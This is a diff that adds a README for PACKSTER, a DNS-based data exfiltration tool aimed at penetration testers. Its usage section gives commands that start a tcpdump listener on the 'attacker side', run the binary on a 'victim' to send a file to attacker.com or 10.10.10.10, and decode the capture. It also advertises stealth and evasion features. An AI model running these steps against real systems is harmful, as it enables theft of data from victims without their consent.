@@ -1,1 +1,78 @@
-# Packster
+# PACKSTER
+
+## Overview
+PACKSTER is a powerful exfiltration tool designed for demonstrating efficient data exfiltration and security testing. It allows for controlled and stealthy data exfiltration by utilizing DNS queries, making it a valuable tool for cybersecurity professionals and penetration testers.
+
+## Features
+- Fast and reliable data exfiltration
+- Supports multiple transport methods
+- Customizable payload handling
+- Stealth mode for evasion techniques
+- Logging and error handling for debugging
+
+[![Packster Demo](https://img.youtube.com/vi/r4g577TrCSw/maxresdefault.jpg)](https://www.youtube.com/watch?v=r4g577TrCSw)
+
+## Installation
+### Prerequisites
+Ensure you have Python installed on your system. PACKSTER requires Python 3.x.
+
+### Clone the Repository
+```bash
+git clone https://github.com/yourusername/packster.git
+cd packster
+```
+
+### Get the [release binaries](https://github.com/Sayan690/Packster/releases/)
+
+OR
+
+### Compile it locally
+
+Requirements - pyinstaller
+
+#### Clone the repository
+```bash
+git clone https://github.com/yourusername/packster.git
+cd packster
+```
+
+```bash
+pyinstaller -F packety.py --icon=resources/packster.ico
+```
+
+### Install Dependencies
+```bash
+pip install -r requirements.txt
+```
+
+## Usage
+To run PACKSTER, follow these steps:
+
+- Start the listener on the attacker side
+
+```bash
+tcpdump -i any -w capture.pcap
+```
+
+- Transfer the [packster binary](https://github.com/Sayan690/Packster/releases/) to the victim side and execute
+
+```bash
+.\\packster.exe -f C:\\Path\\To\\File -a attacker.com
+
+./packster.exe -f /Path/To/File -a 10.10.10.10
+```
+
+- After the process exits printing "done.", exit out from tcpdump, and run `filtrz.py`
+
+```bash
+python3 filtrz.py -a attacker.com -c capture.pcap -o output_file_name.txt
+```
+
+## Disclaimer
+PACKSTER is intended for educational and security testing purposes only. The author is not responsible for any misuse of this tool.
+
+## Author
+Developed by **Sayan Ray** [@BareBones90]
+
+## License
+This project is licensed under the MIT License - see the LICENSE file for details.
